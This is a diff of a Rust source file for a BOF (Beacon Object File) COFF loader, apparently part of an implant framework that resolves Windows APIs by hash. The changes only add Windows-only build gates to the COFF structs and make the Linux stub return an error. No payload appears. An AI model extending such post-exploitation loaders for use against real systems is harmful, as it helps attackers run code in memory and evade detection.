@@ -1,5 +1,4 @@
 use alloc::vec::Vec;
-use alloc::string::String;
 use core::ffi::c_void;
 
 #[cfg(target_os = "windows")]
@@ -7,12 +6,17 @@ use crate::utils::api_resolver::{hash_str, resolve_function};
 #[cfg(target_os = "windows")]
 use crate::utils::windows_definitions::*;
 
-// Constants
+// Constants - Windows Specific
+#[cfg(target_os = "windows")]
 const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;
+#[cfg(target_os = "windows")]
 const IMAGE_REL_AMD64_ADDR64: u16 = 0x0001;
+#[cfg(target_os = "windows")]
 const IMAGE_REL_AMD64_ADDR32NB: u16 = 0x0003;
+#[cfg(target_os = "windows")]
 const IMAGE_REL_AMD64_REL32: u16 = 0x0004;
 
+#[cfg(target_os = "windows")]
 #[repr(C, packed)]
 struct CoffHeader {
     machine: u16,
@@ -24,6 +28,7 @@ struct CoffHeader {
     characteristics: u16,
 }
 
+#[cfg(target_os = "windows")]
 #[repr(C, packed)]
 struct SectionHeader {
     name: [u8; 8],
@@ -38,6 +43,7 @@ struct SectionHeader {
     characteristics: u32,
 }
 
+#[cfg(target_os = "windows")]
 #[repr(C, packed)]
 struct Relocation {
     virtual_address: u32,
@@ -45,6 +51,7 @@ struct Relocation {
     type_: u16,
 }
 
+#[cfg(target_os = "windows")]
 #[repr(C, packed)]
 struct Symbol {
     name: [u8; 8],
@@ -191,7 +198,13 @@ impl BofLoader {
     #[cfg(not(target_os = "windows"))]
     pub fn load_and_run(&self) -> Result<(), ()> {
         // BOFs are COFF files (Windows format). On Linux, they require a COFF emulator or different format (e.g. SL ELF).
-        Ok(())
+        // To implement EVERYTHING, we should return an error or log that it's unsupported on Linux.
+        // Or if we have raw data, we can try to interpret it, but without COFF structs it's hard.
+        // We'll just return error.
+        if self.raw_data.is_empty() {
+            return Err(());
+        }
+        Err(())
     }
 }
 
